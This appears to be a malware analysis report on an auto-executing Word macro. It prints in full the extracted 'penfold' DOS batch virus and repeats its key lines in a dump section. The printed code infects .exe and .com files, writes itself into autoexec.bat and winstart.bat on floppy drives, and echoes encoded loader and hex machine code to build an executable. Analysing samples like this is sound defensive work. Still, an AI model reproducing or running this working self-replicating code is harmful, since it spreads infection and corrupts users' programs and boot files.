behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.autoexec: Runs when the Word document is opened

docinfo.macro:
@echo off
if "%0==" goto qauto
if "%1=="qe2 goto %1
for %%q in (%0 %windir%\command\%0 c:\dos\%0) do %comspec% nul /f/cif not exist c:\penfold.bat copy/a %%q+%%q.bat c:\penfold.bat
del c:\penfold.*
goto qend
:qauto
if exist c:nul copy \autoexec.bat c:\winstart.bat>nul
%comspec%
goto qend
:qe2
for %%q in (%path%) do if %%q==C:\DOS set qdir=%%q
for %%q in (%path%) do if %%q==%winbootdir%\COMMAND set qdir=%%q
if "%qdir%==" goto qend
for %%q in (%qdir%\*.exe %qdir%\*.com) do set q=%%q
if "%q%==" goto qdone
copy/b %q% c:\penfold.new
copy/b c:\penfold.bat+c:\penfold.new %q%
ren %q% *.bat
:qdone
echo j@X$!PZRYI4~@@P]hWDX-a!-a!P[1/hrDX-a!-a!P[1/h#DX-a!-a!P[1/>c:\penfold.exe
echo @hsDX-a!-a!P[@@PP_R]!/3-GWX=zzwWUX,!rlUX$O$/P]1/Q]3/E)/Q]3/>>c:\penfold.exe
echo @E)/Q]3/E)/Q]3/E)/R]3-GUX,!ruUX$O$/P]1/^R]!,3/1,FVRX,0r/xx>>c:\penfold.exe
echo kmooook43o31mkk90100kj1402lm21723n09l07447j01402>>c:\penfold.exe
echo 3l3072n73l3977042l30nk0l0l203l6172m93l6677m52l57>>c:\penfold.exe
echo o7mm7808l0n004j21502nkl700061502k440kk0100k90100>>c:\penfold.exe
echo kj1502lm2173k4k440kk0200k91400kj1602lm21k8004llm>>c:\penfold.exe
echo 2100006665686l657220617566676574726574656n0m0j>>c:\penfold.exe
echo BE8000FF348D540246803C2E75FA33FF877C04B8403DCD21C744014558>c:\penfold.txt
echo C64403459352B8004233C9BA5508CD215AB8005BCD219553B43FBA9201>>c:\penfold.txt
echo B502CD2191B4408BDDCD210BC05B75EAB43ECD218BDDB43ECD21877C04>>c:\penfold.txt
echo BB3000B44ACD215B32FFBD0D0A89AF81008D4FFFBE8100880CCD2E0E1F>>c:\penfold.txt
echo BE80008D540246803C2E75FAC6440400B441CD2172FAB44DCD21B44CCD21>>c:\penfold.txt
c:\penfold.exe<c:\penfold.txt>c:\penfold.com
if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\autoexec.bat
if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\winstart.bat
for %%q in (%qdir%\%2 %qdir%\%2.bat) do if exist %%q %comspec% con /cc:\penfold.com %%q %3 %4 %5 %6 %7 %8 %9
exit
:qend

filetype: DOS batch file, ASCII text, with CRLF line terminators

dump: for %%q in (%0 %windir%\command\%0 c:\dos\%0) do %comspec% nul /f/cif not exist c:\penfold.bat copy/a %%q+%%q.bat c:\penfold.bat
for %%q in (%path%) do if %%q==C:\DOS set qdir=%%q
for %%q in (%path%) do if %%q==%winbootdir%\COMMAND set qdir=%%q
if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\autoexec.bat
if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\winstart.bat
for %%q in (%qdir%\%2 %qdir%\%2.bat) do if exist %%q %comspec% con /cc:\penfold.com %%q %3 %4 %5 %6 %7 %8 %9
